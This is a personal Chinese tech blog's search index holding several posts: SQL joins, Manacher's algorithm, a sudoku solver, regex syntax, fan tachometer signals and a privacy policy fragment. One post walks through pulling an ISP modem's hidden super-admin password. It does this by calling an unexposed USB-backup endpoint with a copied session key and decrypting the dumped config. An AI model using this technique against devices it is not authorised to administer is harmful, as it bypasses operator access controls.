量的数据，它们从一个网络服务器送至您的浏览器并存在计算机硬盘上。小程序使用Cookies\n是为了让其用户受益。Cookies\n可用于储存用户偏好设置、改善用户体验以及跟踪用户趋势（例如用户使用小程序的方式），从而帮助我们提高服务质量。Cookies\n能帮助我们确定您连接的页面和内容，您在小程序特定网页上花费的时间和您所选择的小程序的服务。\nCookies\n是放置在小程序的计算机或服务器上的身份证。它只能被设置它们的服务器阅读，而且不能执行任何代码或病毒。Cookies\n使得小程序能更好、更快地为您服务，并且帮助您对小程序进行一些个性化的设置。然而，您应该能够控制Cookies\n是否以及怎样被您的浏览器接受。请查阅您的浏览器附带的文件以获得更多这方面的信息。\n简而言之，小程序将Cookies\n当作一种便捷的体验，其作用是使得用户在从小程序的一项服务转到另一项服务时，无须再证明自己的身份。您可以通过修改浏览器设置的方式拒绝Cookies，如果您选择拒绝Cookies，则您可能无法登录或使用依赖于Cookies\n的小程序服务或功能。\n7、链接\n小程序承诺在现有技术许可的范围内采取合理必要的预防措施保护用户的数据安全，但是所有的互联网服务商都无法保证数据百分百安全，因此小程序也无法做出绝对的保证。我们会在合理商业运作的基础上，采取尽可能完备的措施保护您存放在小程序中的数据。\n您的个人信息和数据受到多重保护，包括人员的、电子的和程序上的。\n如果小程序得知安全系统漏洞，我们可能联络您提供给我们的电子邮件地址或在我们的网站上发布通知，以试图告知您并提供关于保护措施（如适用）的信息。\n8、数据安全\n我们仅在本《隐私政策》所述目的所必需的期间和法律法规要求的时限内保留您的个人信息。\n我们使用各种安全技术和程序，以防信息的丢失、不当使用、未经授权阅览或披露。例如，在某些服务中，我们将利用加密技术（例如SSL）来保护您提供的个人信息。但请您理解，由于技术的限制以及可能存在的各种恶意手段，在互联网行业，即便竭尽所能加强安全措施，也不可能始终保证信息百分之百的安全。您需要了解，您接入我们的服务所用的系统和通讯网络，有可能因我们可控范围外的因素而出现问题。\n9、更新与公开信息\n小程序鼓励用户更新和修改其个人信息以使其有效。用户能在任何时候非常容易地获取并修改其个人信息。用户可以自行决定修改、删除他们的相关资料。请记住，无论何时您自愿披露个人信息（如在网络上公布），\n此种信息可能被他人收集及使用，因此造成您的个人信息泄露，小程序不承担责任，如果您将个人信息公布在上述渠道，您就有可能造成个人信息泄露。因此，我们提醒并请您慎重考虑是否有必要在上述渠道公开您的个人信息。\n最后，您是唯一对您的账号和密码信息负有保密责任的人。任何情况下，请小心妥善保管。\n10、修改与更新\n由于本隐私政策可能不时被更新，您应定期查看以了解我们保护所收集之个人信息的方案及程序。您继续使用小程序服务即构成您对本隐私政策及其任何更新版本的同意。有关本声明或小程序的隐私措施的问题请与我们联系。\n"},{"title":"成都电信光猫盒子（天邑808AE）破解超级密码记录","url":"/2021/07/20/%E6%88%90%E9%83%BD%E7%94%B5%E4%BF%A1%E5%85%89%E7%8C%AB%E7%9B%92%E5%AD%90%EF%BC%88%E5%A4%A9%E9%82%91808AE%EF%BC%89%E7%A0%B4%E8%A7%A3%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95/","content":"成都电信光猫盒子（天邑808AE）破解超级密码记录\n最近换了工作地点，新租房的房东默认配置了电信宽带，附带上宽带盒子，这个盒子算是一个多功能盒子，包括以下功能：\n\n光猫\n电视盒子（IPTV安卓4.4系统 + 带红外遥控 + 视频/音频HDMI接口 +\n音频SPDIF接口）\n路由（一个千兆网口 + 一个百兆网口）\n2.4G WIFI（带WPS）\n电话（RJ11接口）\n\n还带两个USB2.0接口和SD卡接口，但侧边的USB和SD卡接口都是给IPTV安卓系统使用，只有后面的USB接口可以拿来做存储使用，该口也用作后面的破解密码使用。\n\n进入正题，接下来介绍具体的过程：\n1. 获取管理界面\n一般运营商所附赠的盒子都会在背面标注配置地址，常为192.168.1.1，也会标注上配置账号和密码（下称useradmin账户），访问网页结果如下，目前该设备的账号名为useradmin。\n\n使用给定的useradmin账户登录，查看设备详情，如下图。如果是相同或者相近的产品型号，可以根据我的思路进行破解。\n\n需要注意，该界面，基本只能用于修改修改wifi配置信息，该配置地址192.168.1.1也是一个非运维地址，真正运维地址是192.168.1.1:8080，该网页访问情况如下：\n\n目前，可以使用useradmin账户登录该管理界面，但也存在权限问题。虽然相较于之前的页面多了一些配置内容，但基本都是些无关痛痒的操作，并不能实现对宽带拨号、桥接、IPV6等的修改。要实现完全功能的修改，需要使用真正给运维人员的账户（下称telecomadmin账户），接下来，我们将使用useradmin账户+运维地址192.168.1.1:8080来获取telecomadmin账户。\n2. 利用小trick拿到备份文件\n在广大网友的智慧下，使用useradmin账户登录运维地址，然后打开开发者界面（快捷键F12）,切换到网络面板。然后网页访问：管理→设备管理，在网络请求中找到：MD_Device_user.html，见下图：\n\n该HTML源码中有个函数enableClick()，作用是实现将盒子配置内容备份到USB存储设备中。但在网页中并没有提供触发这个函数的操作（比如点击某个按钮），需要我们手动触发。\n//USB 快速恢复 启用/禁用function enableClick() &#123;   var loc = &#x27;usbbackup.cmd?action=backupeble&#x27;;   with ( document.forms[0] ) &#123;      if ( enable[0].checked == true ) &#123;         if(list.length &gt; 1) &#123;            btnDown.disabled = true;         &#125;         loc += &#x27;&amp;enabled=1&#x27;;      &#125; else if ( enable[1].checked == true ) &#123;         if(list.length &gt; 1) &#123;          btnDown.disabled = false;      &#125;         loc += &#x27;&amp;enabled=0&#x27;;      &#125;   &#125;      loc += &#x27;&amp;sessionKey=&#x27; + sessionKey;      var code = &#x27;location=&quot;&#x27; + loc + &#x27;&quot;&#x27;;   eval(code);&#125;\n分析该函数，发现只需要拼接一个字串，就可以访问该功能。其中enabled代表是否启用USB快速恢复功能，当然此处需要启用。最后拼接如下：\nloc = usbbackup.cmd?action=backupeble&amp;enabled=1&amp;sessionKey=1795138985\n这里的sessionKey来源在源码的上方\nvar obj1Items = &#x27;1|7|0&#x27;;var usblist = &#x27;&#x27;;var list = usblist.split(&quot;|&quot;);var sessionKey = &#x27;1795138985&#x27;;/*var obj1Cols = numOfCol(obj1Items);*//* MDMOID_RESTORE is Type0 object, follow variables are single value */var usbbackenable = getValueFromList(obj1Items, 0);\n给出了 sessionKey 的值，复制过来，拼接成一个完整的字串。\n\n懂URL编码的同学可以发现，该字串就是http请求url的一部分，其中的\nenabled 和 sessionKey 都是GET请求的 params\n\n然后补上前面的地址部分，形成一个完整的访问网址：\n192.168.1.1:8080/usbbackup.cmd?action=backupeble&amp;enabled=1&amp;sessionKey=1795138985\n一定要创建一个新页面，然后打开开发者工具，去访问该网页。如果顺利，会得到一个这样的网页：\n\n但是由于 sessionKey\n有访问时间、次数限制，如果短时间没有进行操作或者重复操作，会访问失败，得到如下结果。\n\n如遇到这样的情况，请重新访问：管理→设备管理，拿到新的\nsessionKey 来访问该网页。下图是是正常的访问页面。\n\n在某些设备中，除上图中的三个按钮（恢复出厂设置、重启、保存设置）外，还有有一个备份配置的按钮，如下：\n\n\n注：该图来源于网络，我的设备没有备份配置按钮\n\n如果你有备份配置按钮，可以提前插入U盘（最好格式化为Fat32格式），然后点击备份配置，得到一个\ncfg 类型文件，跳过之后的步骤到第3步。\n如果你遇到我这样没有备份配置按钮的情况，那么😒，还需要绕一圈。我们继续使用开发者工具，查看该界面代码：\n...var product_type = &#x27;3&#x27;; //added by hlb,2014.04.21...if(product_type == &#x27;4&#x27;)&#123;   document.write(&quot;&lt;div&gt;&quot;);   document.write(&quot;&lt;b id=&#x27;Title_usb_backup_lable&#x27;&gt;USB备份配置:&lt;/b&gt;&quot;);   document.write(&quot;&lt;div style=&#x27;text-align:center&#x27;&gt;&quot;);      document.write(&quot;&lt;p id=&#x27;Title_usb_fast_backup_lable&#x27;&gt;快速恢复：&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;);      document.write(&quot;&lt;label id=&#x27;RecEnable_checkbox&#x27;&gt;&lt;input type=&#x27;radio&#x27; name=&#x27;enable&#x27; onClick=&#x27;enableClick()&#x27; /&gt;启用&lt;/label&gt;&quot;);//...      document.write(&quot;&lt;input type=&#x27;button&#x27; name=&#x27;btnDown&#x27; onClick=&#x27;btnApply()&#x27; value=&#x27; 备份配置 &#x27; /&gt;&quot;);      document.write(&quot;&lt;/p&gt;&quot;);   document.write(&quot;&lt;/div&gt;&quot;);   document.write(&quot;&lt;/div&gt;&quot;);&#125;\n发现product_type还做了限制，必须product_type=4的设备才能有该功能。不过我们可以继续梳理逻辑，如果存在该功能，当点击备份配置按钮的时候，会访问到btnApply()函数，继续找到该函数：\nfunction btnApply() &#123;   var loc = &#x27;usbbackup.cmd?action=backup&#x27;;   with ( document.forms[0] ) &#123;      if ( usbsubarea.value == &quot;&quot; ||  usbsubarea.value == &quot;none&quot; ) &#123;         msg = &#x27;请插入USB设备&#x27;;         alert(msg);         return;      &#125;   //usbsubarea queueintf      idx = usbsubarea.selectedIndex;      val = usbsubarea.options[idx].value;      loc += &#x27;&amp;subarea=&#x27; + val;      loc += &#x27;&amp;sessionKey=&#x27; + sessionKey;   &#125;   var code = &#x27;location.assign(&quot;&#x27; + loc + &#x27;&quot;)&#x27;;   eval(code);&#125;\n又是一个拼接函数，继续按照逻辑拼接，得到如下的结果：\nloc = usbbackup.cmd?action=backup&amp;subarea=usb1_1&amp;sessionKey=1222473631\n其中的 subarea 值和 sessionKey\n的值可以在该页面的上方找到：\nvar obj1Items = &#x27;1|7|0&#x27;;var usblist = &#x27;usb1_1|&#x27;;var list = usblist.split(&quot;|&quot;);var sessionKey = &#x27;781652989&#x27;;\n\n注：若usblist 值为空串，\n请插上U盘重试，建议U盘格式化为Fat32格式。\n\n保证设备后面插上U盘，并形成一个完整的链接：\n192.168.1.1:8080/usbbackup.cmd?action=backup&amp;subarea=usb1_1&amp;sessionKey=781652989\n\n注：subarea 字段值为 sublist\n以|隔断的第一个字串。\n\n访问该链接，如果顺利，不会有访问异常，而且在U盘目录下新生成有如下cfg类型文件：\n\n如果没有该文件，请尝试重试以上步骤🙄，尤其是 sessionKey\n的获取有效。\n3. 使用routerpassview\n获取超级密码\n如果拿到cfg文件，在网络上搜索下载routerpassview软件，并用该软件打开U盘内的cfg文件。如果软件被杀毒软件拦截，请酌情放行。\n\n在软件中查找telecom关键词（快捷键Ctrl +\nF），如果能找到如图的内容，恭喜你破解telecomadmin账户成功👍。账号名为telecomadmin，账户密码为图中Password中间标识的字段，该密码跟随设备，相同设备间一般不一样，甚至同一设备恢复出厂设置后都有可能会修改。\n最后，使用telcomadmin账号登录运维地址\n\n附上 useradmin 账号和 telcomadmin\n账号登录运维地址的截图，可以看到多出来的配置功能。\ntelecomadmin账号登录运维截图\n\nuseradmin账号登录运维截图\n\n"},{"title":"数据库SQL JOINS笔记汇总","url":"/2021/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93SQL%20JOINS%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/","content":"数据库SQL JOINS笔记汇总\n可见下图，一共包括7种连接\n\n\n内连接——inner join\n左连接（左外连接）——left join(left outer join)\n右连接（右外连接）——right join(right outer join)\n左连接不包含内连接——left join excluding inner join\n右连接不包含内连接——right join excluding inner join\n全连接（全外连接）——full join(full outer join)\n全连接不包含内连接——full outer join excluding inner join\n\n创建测试数据\n以下SQL目的在于创建用于测试的test数据集，并创建user_info和mail_info两个信息表\ndrop database if exists test;create database `test` default character set utf8mb4 collate utf8mb4_unicode_ci;use test;create table user_info(    user_id int auto_increment comment &#x27;用户ID&#x27;        primary key,    name    varchar(20)   not null comment &#x27;用户名&#x27;,    lv      int default 1 not null comment &#x27;等级&#x27;)    comment &#x27;用户信息表&#x27;;create table mail_info(    mail_id int auto_increment comment &#x27;邮件ID&#x27;        primary key,    title   varchar(50) not null comment &#x27;邮件标题&#x27;,    user_id int         not null comment &#x27;user_info.user_id外键（不设约束）&#x27;)    comment &#x27;邮件信息表&#x27;;insert into user_info(user_id, name, lv)values (1001, &#x27;Bill&#x27;, 100),       (1002, &#x27;William&#x27;, 220),       (1003, &#x27;Joseph&#x27;, 80);insert into mail_info(mail_id, title, user_id)values (1, &#x27;Happy Birthday&#x27;, 1002),       (2, &#x27;Congrats on obtaining&#x27;, 1006),       (3, &#x27;Enjoy Charm Beach&#x27;, 1010);\nuser_id表： \nmail_id表 ：\n内连接——inner join\n内连接是一种一一映射关系，就是两张表都有的才能显示出来\n用韦恩图表示是两个集合的交集，如图：\n\n# 内连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         inner join mail_info as mi on ui.user_id = mi.user_id;\n查询结果\n\n左连接（左外连接）——left\njoin(left outer join)\n左连接是左边表的所有数据都有显示出来，右边的表数据只显示共同有的那部分，没有对应的部分只能补空显示，所谓的左边表其实就是指放在left\njoin的左边的表 用韦恩图表示如下：\n\n# 左连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         left join mail_info mi on ui.user_id = mi.user_id;\n查询结果\n\n右连接（右外连接）——right\njoin(right outer join)\n右连接正好是和左连接相反的，这里的右边也是相对right\njoin来说的，在这个右边的表就是右表 用韦恩图表示如下：\n\n# 右连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         right join mail_info mi on ui.user_id = mi.user_id;\n查询结果：\n\n左连接不包含内连接——left\njoin excluding inner join\n这个查询是只查询左边表有的数据，共同有的也不查出来\n韦恩图表示如下：\n\n# 左连接不包含内连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         left join mail_info mi on ui.user_id = mi.user_idwhere mi.user_id is null;\n查询结果：\n\n右连接不包含内连接——right\njoin excluding inner join\n右连接正好是和左连接相反的，这里的右边也是相对right\njoin来说的，在这个右边的表就是右表 用韦恩图表示如下：\n\n# 右连接不包含内连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         right join mail_info mi on ui.user_id = mi.user_idwhere ui.user_id is null;\n查询结果：\n\n全连接（全外连接）——full\njoin(full outer join)\n查询出左表和右表所有数据，但是去除两表的重复数据 韦恩图表示如下：\n\n# 全连接# mysql 不支持全连接# select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_id# from user_info as ui#          full join mail_info mi on ui.user_id = mi.user_id;# 用以下方式实现，全链接 = 左连接 union 右连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         left join mail_info mi on ui.user_id = mi.user_iduniondistinctselect ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         right join mail_info mi on ui.user_id = mi.user_id;\n查询结果：\n\n全连接不包含内连接——full\nouter join excluding inner join\n意思就是查询左右表各自拥有的那部分数据 韦恩图表示如下：\n\n# 全连接不包含内连接# select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_id# from user_info as ui#          full join mail_info mi on ui.user_id = mi.user_id# where ui.user_id is null#    or mi.user_id is null;# 用以下方式实现，全连接不包含内连接 = 左连接不包含内连接 union all 右连接不包含内连接select ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         left join mail_info mi on ui.user_id = mi.user_idwhere mi.user_id is nullunion allselect ui.user_id, ui.name, ui.lv, mi.mail_id, mi.title, mi.user_idfrom user_info as ui         right join mail_info mi on ui.user_id = mi.user_idwhere ui.user_id is null;\n查询结果：\n\n"},{"title":"描述命令行参数","url":"/2025/04/28/%E6%8F%8F%E8%BF%B0%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0/","content":"描述命令行参数\n命令 &lt;必选参数|必选参数&gt; [--option &lt;参数1|参数2|参数3&gt;] \n\n&lt;&gt; 尖括号：必选参数；\n[] 方括号：可选参数，按需使用；\n| 竖线：用于分隔多个互斥参数，使用时只能选择一个;\n- 连字符： 表示参数名，-- 表示全称，- 表示简写；\n\n"},{"title":"最长回文子串算法——Manacher算法","url":"/2020/12/28/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94Manacher%E7%AE%97%E6%B3%95/","content":"最长回文子串算法——Manacher算法\nManacher算法是一个用来查找一个字符串中的最长回文子串(不是最长回文序列)的线性算法。其优点就是把时间复杂度从暴力算法的O(n2)优化到O(n)。\n\nManacher 算法，又被中国程序员戏称为“马拉车”算法\n\n暴力匹配算法\n暴力匹配算法的原理\n暴力匹配算法的原理很简单，如下：\n\n依次向尾部进行遍历，访问一个字符；\n以此字符为中心点向两边扩展，记录该点的最长回文长度；\n取各个字符的回文子串长度的max。\n\n暴力匹配算法存在的问题\n\n偶数回文串需要额外修改\n在奇数字符串中，例如 aba，对应的回文长度是\n131。而例如abba，以使用中心扩展的比较原则下计算出来的回文长度是\n1111，我们对奇数回文串求出了正确答案，但是在偶数回文串上并没有得到我们想要的结果，需要针对偶数情况进行额外修改。\n时间复杂度O(n2)\n外层需要遍历每一个字符，而每到一个新字符就需要向两边扩展比对，所以时间复杂度达到了O(n * n)。\n\nManacher算法本质上也是基于暴力匹配的方法，只不过做了一点简单的预处理，且在扩展时提供了加速\nManacher算法的预处理\nManacher算法对偶数字符串做了预处理，这个预处理可以巧妙的让所有（包括奇和偶）字符串都变为奇数回文串。操作实现也很简单，就是将原字符串的首部和尾部以及每两个字符间插入一个特殊字符（假设为#号），这个字符不会影响最终的结果，这一步预处理操作后的效果就是原字符串的长度从n改变成了2n + 1。比如我们的原字符串是\nabba，假设预处理后的字符串是\n#a#b#b#a#，我们在任意一个点，比如字符\n#，向两端匹配只会出现原始字符匹配原始字符，#匹配\n#\n的情况，不会出现原字符串字符与特殊字符匹配的情况，这样就能保证我们不会改变原字符串的匹配规则。该预处理得到进行下一步扩展的字符串，并且从预处理后的字符串得到的最长回文字符串的长度除以2就是原字符串的最长回文子串长度，也就是我们想要得到的结果。\nManacher算法核心\n概念\n\nManacherString：经过Manacher预处理的字符串，以下的概念都是基于ManasherString产生的。\n回文半径：经过处理后的字符串的长度一定是奇数，回文半径就是以回文中心字符的回文子串长度的一半。\n回文直径：回文半径 * 2 − 1。\n最右回文边界R：遍历字符串时，每个字符的最长回文子串都会有个右边界，而R则是所有已知右边界中最右的位置。R值保持单增。\n回文中心C：取得当前R的上一次更新时候的回文中心。\n半径数组P[]：该数组记录原字符每一个字符对应的最长回文半径。\n\n算法流程\n步骤1：将原字符串转换为ManacherString，定义为S\n步骤2：R和C的初始值为−1，创建半径数组P[]\n\n存在与概念相差的小偏差，R实际是最右边界位置的右一位。\n\n步骤3：开始从下标i = 0到len(S) − 1，去遍历字符串S\n后续存在多个分支，总览如下：\n\n​ 分支1：当 i &gt; R\n时，暴力匹配当前i位置字符的最长回文长度，并判断更新R和C。例如aabcd：\ni = 0，R = −1 时，初次更新R = 1（i = 0字符a的最长回文右边界下标0的右一位），C = 0\n​ 分支2：i ≤ R ​时，也就是说当前i下标的字符已经在某个字符的回文半径覆盖中，该分支存在三种情况，解释三种情况前，需要先理解以下模型：\n\nL是当前R关于C的对称点，i′是i关于C的对称点，因此i′ = 2 * C − i，并且因为从左至右遍历i，所以i′的回文区域是前面已知的（信息保存在半径数组P[i′]中）。我们可以依赖该信息判断是否进行加速。\n​ 情况1：i′的回文区域在$\\overline{LR}$的内部，因为整个$\\overline{LR}$就是一个回文串，我们可以直接得出i的回文直径与i′相同。\n\n​ 情况2：i′的回文半径左边界超过L，这种情况，仅能保证i的回文半径是i到R。\n\n​ 情况3：i′的回文区域左边界恰好和L重合，此时i的回文半径至少是i到R，并且回文区域从R继续向外部匹配。\n\n时间复杂度\nManacher算法时间复杂度为O(n)。我们可以想象下，这就是一个\ni在追逐R的游戏，无非两种情况：\n\nR不动，同时i向右追一步。（花O(1)时间计算P[i]）\nR继续往右走几步，同时i追上一步。（所谓更新R，更新C）\n\n当R到达最右边界以后，就剩下i一步一步追上来。\n因此，每个字符最多被访问两次，一次被R经过，一次被追赶的i经过。所以时间复杂度是O(2 * (2n + 1)) = O(n)。\n代码\n代码引用自我的github仓库地址：longest-palindromic-substring.go\n有关题目可参考Leetcode题目： Longest\nPalindromic Substring\n"},{"title":"服务器4线风扇接口定义以及转速读取机制","url":"/2025/03/04/%E6%9C%8D%E5%8A%A1%E5%99%A84%E7%BA%BF%E9%A3%8E%E6%89%87%E6%8E%A5%E5%8F%A3%E5%AE%9A%E4%B9%89%E4%BB%A5%E5%8F%8A%E8%BD%AC%E9%80%9F%E8%AF%BB%E5%8F%96%E6%9C%BA%E5%88%B6/","content":"服务器4线风扇接口定义以及转速读取机制\n一般服务器或交换机上的风扇接口都会走以下几种信号：\n\n\n\n线定义\n线常用颜色\n功能描述\n\n\n\n\nPOWER/VCC\n红色\n供电，一般为12V\n\n\nGND\n黑色\nGND接地\n\n\nPWM\n蓝色\n调速信号，方波占空比\n\n\nTACH/FG\n黄色或白色\n测速信号，可用作闭环控制\n\n\n\n\nTACH（Tachometer）信号，转速表的意思，一些说明书里也被称为FG（Frequency\nGenerator）信号。注意TACH是开集电极输出，需要上拉电阻。\nTACH信号输出的是一个频率可变的方波信号。其原理是，在风扇转子旁边布置了一个霍尔传感器，当电机转动的时候，电机的转子的磁体经过霍尔传感器时，输出一个高电平，经过信号处理后输出一个方波。因为转子转一圈一般会输出2个方波信号，因此方波的2个周期的时间就是电机转子转动一圈的时长。因此，电机转速\nrpm = Freq方波 * 60/2\n，单位为 rad/min\n。\n在实际检测电路中，定义常量 Npuls\n表示风扇每转一圈产生脉冲个数，一般为2；定义一个测量时间窗\nTmea\n（例如500ms）；设置一个计数器 M（例如8bit），用于统计时间窗内收到的脉冲数；\n那么风扇转速为： rpm = M * 60/(Tmea * Npuls)\n，单位为 rad/min\n。因为计数器 M\n存在最大值，如果风扇的满转速过高，需要配置减小测量的时间窗以匹配。\n"},{"title":"数独求解 go语言版","url":"/2020/11/30/%E6%95%B0%E7%8B%AC%E6%B1%82%E8%A7%A3%20go%E8%AF%AD%E8%A8%80%E7%89%88/","content":"数独求解 go语言版\n源代码github地址：https://github.com/smilelc3/sudoku-solver\n关于数独wiki介绍：https://zh.wikipedia.org/wiki/%E6%95%B8%E7%8D%A8\n一个数独样例\n+-----------------------------+|       5 | 3       |         || 8       |         |    2    ||    7    |    1    | 5       ||---------+---------+---------|| 4       |       5 | 3       ||    1    |    7    |       6 ||       3 | 2       |    8    ||---------+---------+---------||    6    | 5       |       9 ||       4 |         |    3    ||         |       9 | 7       |+-----------------------------+\n规则\n\n游戏一般由9个3×3个的九宫格组成。\n每一列的数字均须包含 1～9，不能缺少，也不能重复。\n每一行的数字均须包含 1～9，不能缺少，也不能重复。\n每一宫(粗黑线围起来的区域，通常是 3*3 的九宫格)的数字均须包含\n1～9，不能缺少，也不能重复。\n\n算法介绍\n实现了两种求数独的算法：\n\n基于摈弃原则的深度优先搜索算法(dfs)\n优化的舞蹈链算法(Dance Links X)\n\n一、基于摈弃原则的深度优先搜索算法\n说明\n计算流程如下：\n\n一般正常数独耗时&lt;10ms，算法主要是深度优先搜索，但是做了几点优化：\n\n优先填写唯一解的单元格\n下一次搜索节点为全局可能性最小单元格（近似贪心）\n\n补充\n\n其实可以做二进制编码优化，时间复杂度降低一个数量级。但主要是为了代码易读，并非为了极致时间效率；\n\n二、优化的舞蹈链算法\n\n\n舞蹈链算法介绍见博客：跳跃的舞者，舞蹈链（Dancing\nLinks）算法——求解精确覆盖问题\n优化思路来自于博客：算法实践——舞蹈链（Dancing\nLinks）算法求解数独\n\n主要优化有三点：\n\n提前优先处理唯一单元格\n优先标记最小可能舞蹈链列元素，极大降低了递归深度（近似贪心）\n先把有数字的格子转换为舞蹈链行，插入到矩阵中，便于计算时优先选中，且仅插入规则合法行，以便减少迭代次数\n\n测试与对比\ntest\n文件夹中，含有各种测试样例，包含号称 最难数独\n样例文件7hardest\n测试结果基于400次重复求解用时均值，仅具有一定参考\n\n\n\n样例文件\n深度优先搜索算法\n舞蹈链算法\n备注\n\n\n\n\n0finished\n0 ms\n0.557 ms\n已完成的数独\n\n\n1dream\n3.027 ms\n2.904 ms\n全空\n\n\n2easier\n0.010 ms\n0.567 ms\n仅一个位置未填\n\n\n3easy\n0.750 ms\n0.840 ms\n\n\n\n4normal\n12.16 ms\n1.452 ms\n\n\n\n5hard\n0.829 ms\n1.060 ms\n\n\n\n6harder\n3.871 ms\n1.239 ms\n\n\n\n7hardest\n189.212 ms\n18.623 ms\n号称最难数独\n\n\n\n\n在某些特殊情况下，深度优先搜索深度低，在较为简单的数独上效率高；\n舞蹈链算法稳定高效，适用于精确覆盖类问题，用额外的空间开销与特殊的数据结构，在复杂数独上效果显著。\n\n最难数独运行程序结果\n+-----------------------------+| 8       |         |         ||       3 | 6       |         ||    7    |    9    | 2       ||---------+---------+---------||    5    |       7 |         ||         |    4  5 | 7       ||         | 1       |    3    ||---------+---------+---------||       1 |         |    6  8 ||       8 | 5       |    1    ||    9    |         | 4       |+-----------------------------+已读取数独 test/7hardest+-----------------------------+| 8  1  2 | 7  5  3 | 6  4  9 || 9  4  3 | 6  8  2 | 1  7  5 || 6  7  5 | 4  9  1 | 2  8  3 ||---------+---------+---------|| 1  5  4 | 2  3  7 | 8  9  6 || 3  6  9 | 8  4  5 | 7  2  1 || 2  8  7 | 1  6  9 | 5  3  4 ||---------+---------+---------|| 5  2  1 | 9  7  4 | 3  6  8 || 4  3  8 | 5  2  6 | 9  1  7 || 7  9  6 | 3  1  8 | 4  5  2 |+-----------------------------+深度优先搜索法所用时间： 189.9914 ms+-----------------------------+| 8  1  2 | 7  5  3 | 6  4  9 || 9  4  3 | 6  8  2 | 1  7  5 || 6  7  5 | 4  9  1 | 2  8  3 ||---------+---------+---------|| 1  5  4 | 2  3  7 | 8  9  6 || 3  6  9 | 8  4  5 | 7  2  1 || 2  8  7 | 1  6  9 | 5  3  4 ||---------+---------+---------|| 5  2  1 | 9  7  4 | 3  6  8 || 4  3  8 | 5  2  6 | 9  1  7 || 7  9  6 | 3  1  8 | 4  5  2 |+-----------------------------+舞蹈链法所用时间： 20.0401 msProcess finished with exit code 0\n"},{"title":"正则表达式","url":"/2023/12/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","content":"\n正则表达式\n常用表达式语法\n\n\n\n\n\n\n\n\n语法\n描述\n用例\n\n\n\n\n\\\n将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个进制转义符。\nn匹配字符n。\\n匹配一个换行符。连续\\\\匹配\\，而\\(匹配(\n\n\n^\n匹配输入字符串的开始位置\n\n\n\n$\n匹配输入字符串的结束位置\n\n\n\n*\n匹配前面的子表达式零次或多次。*等价于{0,}\nzo*能匹配z以及zoo\n\n\n+\n匹配前面的子表达式一次或多次。+等价于{1,}\nzo+能匹配zo以及zoo，但不能匹配z\n\n\n?\n匹配前面的子表达式零次或一次。?等价于{0,1}\npassword(s)?可以匹配pawwsord或passwords\n\n\n{n}\nn是一个非负整数。必须匹配n次\nfo{2}d不能匹配fo，但是能匹配foo\n\n\n{n,}\nn是一个非负整数。至少匹配n次\ngo{2,}d不能匹配god，但是能匹配good和gooood\n\n\n{n,m}\nm和n均为非负整数，其中n&lt;=m。最少匹配n次且最多匹配m次，请注意在逗号和两个数之间不能有空格。\n\n\n\n?\n当该字符紧跟在任何一个其他限制符\n*,+,?, {n}, {n,}, {n,m}\n后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串\n对于字符串oooo，o+?将匹配单个o，而o+将匹配所有o\n\n\n.\n匹配除\\n之外的任何单个字符。要匹配包括\\n在内的任何字符，请使用像(.\\|\\n)的模式。\n\n\n\n(pattern)\n匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，要匹配圆括号字符，请使用\\(\n或 \\)\n\n\n\nx\\|y\n匹配x或y，也可以多个一起使用x\\|y\\|z\n(b\\|f)oo能匹配boo或foo。b\\|foo则匹配b或foo\n\n\n[xyz]\n匹配所包含的任意一个字符\n[abc]{2}可以匹配aa或ac或bb等\n\n\n[^xyz]\n匹配未包含的任意一个字符\n\n\n\n[a-z]\n字符范围。匹配指定范围内的任意字符\n[a-z]+可以匹配任意长度的小写字母字符串\n\n\n\\d\n匹配一个数字字符。等价于[0-9]\n\n\n\n\\D\n匹配一个非数字字符。等价于[^0-9]\n\n\n\n\\n\n匹配一个换行符。等价于\\x0a\n\n\n\n\\r\n匹配一个回车符。等价于\\x0d\n\n\n\n\\s\n匹配一个任何空白字符，包括空格、制表符、换页符等等。等价于[\\f\\n\\r\\t\\v]\n\n\n\n\\S\n匹配一个任何非空白字符，等价于[^\\f\\n\\r\\t\\v]\n\n\n\n\\t\n匹配一个制表符。等价于\\x09\n\n\n\n\\w\n匹配一个包括下划线的任何单词字符。等价于[A-Za-z0-9_]\n\n\n\n\\W\n匹配任何非单词字符。等价于[^A-Za-z0-9_]\n\n\n\n\\un\n匹配Unicode字符，其中n是一个用四个十六进制数字表示的Unicode字符\n\\u00A9匹配版权符号©，[\\u4e00-\\u9fa5]匹配中文字符\n\n\n\n"},{"title":"真正的电音：Cymatics","url":"/2017/05/24/%E7%9C%9F%E6%AD%A3%E7%9A%84%E7%94%B5%E9%9F%B3Cymatics/","content":"\n\n\n\n歌曲：Cymatics*\n歌手：Cymatics\n所属专辑： Solar 